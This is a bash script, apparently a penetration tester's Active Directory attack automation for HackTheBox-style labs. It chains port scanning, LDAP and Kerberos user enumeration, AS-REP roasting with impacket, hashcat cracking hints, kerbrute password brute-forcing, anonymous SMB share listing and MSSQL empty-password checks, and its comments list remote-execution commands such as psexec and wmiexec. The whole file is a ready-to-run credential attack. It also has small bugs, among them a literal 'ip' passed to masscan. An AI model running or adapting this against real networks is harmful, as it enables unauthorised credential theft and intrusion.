#!/bin/bash
# dogasantos
# https://github.com/dogasantos
#
 
passwdwl="/usr/share/wordlists/SecLists/Passwords/Common-Credentials/all.txt"
passwdwl2="/usr/share/wordlists/rockyou.txt"
userswl="/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames-dup.txt"

ip=$(cat ip)

masscan -Pn -p1-65535 ip > masscan.report
masstomap -m masscan.report -o nmap.tcp

echo "[*] Extracting ldap basic info"
ldapsearch -LLL -x -H ldap://$ip -b '' -s base '(objectclass=*)' > base.ldap 2>&1
baseldap=$(cat base.ldap|wc -l)

if [ $baseldap -gt 20 ]
then
	host=$(cat dn.ldap |grep dnsHostName|cut -f2 -d ':'| tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
	domain=$(cat dn.ldap |grep ldapServiceName|awk -F ":" '{print $2}'| tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
	ldapsearch -x -b CN=Users,DC=htb,DC=local "*" -H ldap://$ip > cn-users.ldap 2>&1

else
	domain=$(cat nmap.tcp.nmap.txt |grep Domain|head -n1|cut -f2 -d :|cut -f1 -d ,|tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
	host=$(dig srv $domain @$ip|grep SOA|awk -F "IN\tSOA\t" '{print $2}'|awk -F ". " '{print $1}')
fi


has445=$(cat nmap.tcp.nmap.grepable|grep "445/open/tcp"|grep open|wc -l )
has135=$(cat nmap.tcp.nmap.grepable|grep "135/open/tcp"|grep open|wc -l)
has1433=$(cat nmap.tcp.nmap.grepable|grep "1433/open/tcp"|grep open|wc -l)
hasldap=$(cat nmap.tcp.nmap.grepable|grep "ldap"|grep open|wc -l)
haskerberos=$(cat nmap.tcp.nmap.grepable|grep "88/open/tcp"|grep open|wc -l)

if [ $haskerberos -gt 0 ]
then
	echo "[*] Extracting users"

	echo "  + via blank GetADUsers"
	/opt/impacket/examples/GetADUsers.py $domain/ -all -dc-ip $ip|grep -v SM_ |grep -v Mailbox |grep -v '$' |grep -v 'krbtgt' |grep -v SecureAuth|grep -v Querying|grep -v "PasswordLastSet"|grep -E "\s+"|grep -v -E '^-+'|awk -F " " '{print $1}' | sort|uniq > users.txt

	if [ $(cat users.txt|wc -l) -eq 0 ]
	then
		echo "  + via ldap search (windapsearch)"
		python /usr/share/windapsearch/windapsearch.py -d $domain -U --dc-ip $ip --full |grep userPrincipalName|grep -v '{' |grep -v Mailbox|grep -v -E ".*-.*-.*" |awk -F "userPrincipalName: " '{print $2}' > users.ldap
		cat users.ldap|tr [A-Z] [a-z] |cut -f1 -d @ |sort|uniq >users.txt
	fi

	if [ $(cat users.txt|wc -l) -eq 0 ]
	then
		echo "   via bruteforcing kerberos (kerbrute)"
		kerbrute userenum --dc $host -d $domain -o users.kerbrute $userswl
		cat users.kerbrute |grep VALID| awk -F "VALID USERNAME:\t " '{print $2}' |tr [A-Z] [a-z] |cut -f1 -d @ |sort|uniq >users.txt
		echo "[*] Found: $(cat users.txt|wc -l ) valid users" 		
	fi

	echo "[*] Extracting AS REP users/hashes (Kerberos preauthentication not required)"
	python3 /opt/impacket/examples/GetNPUsers.py $domain/ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile hashes.asreproast
	if [ $(cat hashes.asreproast|wc -l) -gt 0 ]
	then
		echo "  + Sucess! "
		echo "  + Crack the hashes.asreproast file with hashcat with:"
		echo "  + hashcat -m 18200 -a 0 --self-test-disable --force ~/hashes.asreproast $passwdwl2"
		echo "  + Later on:"
		echo "  + python GetUserSPNs.py $domain/user:pass -outputfile hashes.kerberoast"
		echo "  + check notes ($0) for more"

		# getnpusers -dc-ip $ip $domain/$user:$pass -request -format hashcat -outputfile hashes.npu
		# GetUserSPNs.py $domain/$user:$pass -request-user hsmith
		# getadusers -all $domain/$user:$pass -dc-ip $ip
		# python3 atexec.py $domain/$user:$pass@$ip systeminfo
		# python3 dcomexec.py $domain/$user:$pass@$ip systeminfo
		# python3 psexec.py $domain/$user:$pass@$ip systeminfo
		# python3 smbexec.py $domain/$user:$pass@$ip systeminfo
		# python3 wmiexec.py $domain/$user:$pass@$ip systeminfo
		# python3 lookupsid.py $domain/$user:$pass@$ip systeminfo


	else
		echo "  + Failed! "
		echo "[*] Bruteforcing passwords via kerberos (kerbrute)"
		users=$(cat users.txt)
		for user in $users
		do
			echo "  + Attempt: $user"
			kerbrute bruteuser --safe --dc $host -d $domain $passwdwl $user -o credentials.txt
		done
	fi



	echo "[*] Checking for unauthenticated rpc and smb"
	if [ $has445 -gt 0 ]
	then
		echo "[*] Smb Shares (smbclient):"
		smbclient -N -L //$ip
		echo "[*] Net share (rpcclient)"
		rpcclient -U "" -N -c netshareenum $ip
		

	fi

	if [ $has1433 -gt 0 ]
	then 
		echo "[*] Testing MSSQL"
		nmap -n -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
	fi
fi
